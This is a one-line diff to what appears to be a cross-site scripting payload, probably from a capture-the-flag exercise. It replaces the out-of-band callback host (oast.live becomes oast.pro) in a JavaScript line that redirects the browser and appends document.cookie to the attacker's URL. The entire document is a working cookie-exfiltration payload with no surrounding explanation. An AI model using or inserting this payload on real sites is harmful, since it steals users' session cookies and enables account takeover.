@@ -1,1 +1,1 @@
-location = "http://cmltn19ri87csasqbji0ea5dmjbj4c18n.oast.live?flag=" + document.cookie;
+location = "https://cmltu8hri87csh6p916033onbm9xzc8a4.oast.pro?flag=" + document.cookie;
